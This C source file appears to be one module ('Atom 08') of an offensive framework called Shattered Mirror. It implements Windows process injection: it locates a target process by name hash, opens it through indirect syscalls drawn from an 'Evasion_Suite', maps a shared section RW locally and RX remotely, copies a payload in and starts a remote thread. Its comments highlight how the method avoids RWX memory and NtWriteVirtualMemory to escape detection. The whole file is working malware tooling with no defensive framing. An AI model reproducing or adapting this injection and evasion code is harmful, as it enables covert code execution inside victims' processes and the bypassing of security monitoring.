/*=============================================================================
 * Shattered Mirror v1 — Atom 08: Process Injection
 *
 * Section-Based Map/View Injection Implementation.
 * Relies entirely on the Orchestrator's Indirect Syscall table via Atom_03_Sys.
 * 
 * 1. Open Target Process (IndirectNtOpenProcess)
 * 2. Create Section in Local Process (IndirectNtCreateSection)
 * 3. Map View in Local Process as RW (IndirectNtMapViewOfSection)
 * 4. Map View in Target Process as RX (IndirectNtMapViewOfSection)
 * 5. Copy payload into Local View (automatically reflects to Target View)
 * 6. Spawn Thread in Target (IndirectNtCreateThreadEx)
 *===========================================================================*/

#include "Atom_08_Proc.h"
#include "Atom_03_Sys.h" /* Syscall Linker */
#include "../Evasion_Suite/include/indirect_syscall.h"
#include "../Evasion_Suite/include/common.h"
#include <tlhelp32.h>

/* Helper for finding process by DJB2 hash of the name */
DWORD FindTargetProcess(DWORD dwProcNameHash) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe)) {
        do {
            /* Case-insensitive hash */
            char szName[MAX_PATH] = { 0 };
            int len = lstrlenA(pe.szExeFile);
            for(int i = 0; i < len; i++) {
                char c = pe.szExeFile[i];
                szName[i] = (c >= 'A' && c <= 'Z') ? (c + 32) : c;
            }

            if (djb2_hash_rt(szName) == dwProcNameHash) {
                CloseHandle(hSnapshot);
                return pe.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return 0;
}

/* 
 * The main Section Mapping injection routine 
 */
BOOL InjectPayloadSectionMap(DWORD dwTargetPid, const BYTE* pPayload, SIZE_T szPayloadSize) {
    if (dwTargetPid == 0 || !pPayload || szPayloadSize == 0) return FALSE;

    /* Ensure Syscall wrapper is hooked up (Assuming Orchestrator InitSyslink was called) */

    /* 1. Open target process */
    HANDLE hTargetProc = NULL;
    SM_OBJECT_ATTRIBUTES oa = { sizeof(oa) };
    SM_CLIENT_ID cid = { (HANDLE)(ULONG_PTR)dwTargetPid, NULL };
    
    // Using Indirect Syscalls directly from the global table
    // (Assuming this Atom is linked to the Orchestrator's evasion suite)
    NTSTATUS status = IndirectNtOpenProcess(&hTargetProc, PROCESS_ALL_ACCESS, &oa, &cid);
    if (!NT_SUCCESS(status) || hTargetProc == NULL) return FALSE;

    /* 2. Create Section (Local, PAGE_EXECUTE_READWRITE for the section object itself) */
    HANDLE hSection = NULL;
    LARGE_INTEGER liSize = { 0 };
    liSize.QuadPart = szPayloadSize;

    status = IndirectNtCreateSection(&hSection, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE,
                                     NULL, &liSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if (!NT_SUCCESS(status)) {
        IndirectNtClose(hTargetProc);
        return FALSE;
    }

    /* 3. Map View in LOCAL process (Read/Write) */
    PVOID pLocalBaseAddress = NULL;
    SIZE_T ViewSize = 0;
    status = IndirectNtMapViewOfSection(hSection, (HANDLE)-1, &pLocalBaseAddress, 0, 0, NULL,
                                        &ViewSize, 1 /* ViewUnmap */, 0, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) {
        IndirectNtClose(hSection);
        IndirectNtClose(hTargetProc);
        return FALSE;
    }

    /* 4. Map View in REMOTE target process (Read/Execute) */
    /* This avoids ever having memory marked as RWX in the target! */
    PVOID pRemoteBaseAddress = NULL;
    status = IndirectNtMapViewOfSection(hSection, hTargetProc, &pRemoteBaseAddress, 0, 0, NULL,
                                        &ViewSize, 1 /* ViewUnmap */, 0, PAGE_EXECUTE_READ);
    if (!NT_SUCCESS(status)) {
        IndirectNtUnmapViewOfSection((HANDLE)-1, pLocalBaseAddress);
        IndirectNtClose(hSection);
        IndirectNtClose(hTargetProc);
        return FALSE;
    }

    /* 5. Copy payload to local view */
    /* Because they map to the same physical section, it instantly appears in the remote process */
    /* No NtWriteVirtualMemory needed! */
    memcpy(pLocalBaseAddress, pPayload, szPayloadSize);

    /* 6. Execute Payload in Target using NtCreateThreadEx */
    HANDLE hRemoteThread = NULL;
    status = IndirectNtCreateThreadEx(&hRemoteThread, THREAD_ALL_ACCESS, NULL, hTargetProc,
                                      pRemoteBaseAddress, NULL, 0, 0, 0, 0, NULL);

    /* Cleanup */
    IndirectNtUnmapViewOfSection((HANDLE)-1, pLocalBaseAddress);
    IndirectNtClose(hSection);
    
    if (hRemoteThread) {
        IndirectNtClose(hRemoteThread);
    }
    
    IndirectNtClose(hTargetProc);

    return NT_SUCCESS(status);
}
